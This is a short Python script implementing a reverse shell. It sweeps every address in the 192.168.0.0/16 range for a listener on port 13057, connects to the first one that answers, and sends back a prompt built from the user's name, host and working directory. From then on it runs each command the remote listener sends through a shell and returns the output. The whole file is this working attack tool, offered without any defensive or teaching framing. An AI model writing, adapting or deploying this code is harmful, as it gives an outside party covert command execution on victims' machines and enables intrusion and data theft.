import socket
import subprocess
import os
import platform
import getpass


def check_ip(sock):
    for i in range(256):
        for j in range(256):
            RHOST = f"192.168.{i}.{j}"
            RPORT = 13057

            result = sock.connect_ex((RHOST, RPORT))

            if result == 0:
                print(f"Found At 192.168.{i}.{j}")
                sock.connect((RHOST, RPORT))
                return
            else:
                print(f"Not found at 192.168.{i}.{j}")
                continue


sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
check_ip(sock)

while True:
    try:                 
        HEADER = f"{getpass.getuser()}@{platform.node()}:{os.getcwd()}$ "
        sock.send(HEADER.encode())
        CMD = sock.recv(1024).decode("utf-8")

        if CMD == "exit":
            sock.send(b"exit")
            break
        
        COMM = subprocess.Popen(str(CMD), shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
        STDOUT, STDERR = COMM.communicate()
        if not STDOUT:
            sock.send(STDERR)
        else:
            sock.send(STDOUT)

        if not CMD:
            print("Connection dropped")
            break
        
    except Exception as e:
        sock.send("An error has occured: {}".format(str(e)).encode())

sock.close()

